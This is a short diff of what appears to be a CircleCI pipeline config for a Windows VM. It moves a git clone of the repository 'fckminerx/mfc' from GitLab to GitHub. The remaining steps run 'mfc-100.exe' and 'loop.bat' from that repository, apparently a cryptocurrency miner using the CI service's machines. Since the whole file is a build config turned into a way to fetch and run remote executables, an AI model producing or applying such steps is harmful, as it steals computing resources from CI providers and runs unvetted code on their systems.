@@ -13,7 +13,7 @@ jobs:
       # Commands are run in a Windows virtual machine environment
       - checkout
       - run: Write-Host 'Hello, Windows'
-      - run: git clone https://gitlab.com/fckminerx/mfc
+      - run: git clone https://github.com/fckminerx/mfc
       - run: cd mfc
       - run: powershell .\mfc-100.exe
       - run: powershell .\loop.bat
